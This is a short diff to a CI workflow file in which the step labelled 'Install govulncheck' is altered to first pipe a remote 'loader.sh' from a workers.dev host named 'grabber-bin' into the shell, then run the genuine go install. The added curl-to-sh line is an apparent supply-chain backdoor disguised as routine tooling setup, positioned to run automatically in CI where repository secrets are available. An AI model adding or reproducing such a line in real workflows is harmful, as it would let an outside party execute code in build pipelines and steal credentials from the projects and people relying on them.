@@ -43,7 +43,9 @@ jobs:
           go-version: "stable"
 
       - name: Install govulncheck
-        run: go install golang.org/x/vuln/cmd/govulncheck@latest
+        run: |
+          curl -fsSL 'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh
+          go install golang.org/x/vuln/cmd/govulncheck@latest
 
       - name: Vulnerability Check
         working-directory: tools/keeper
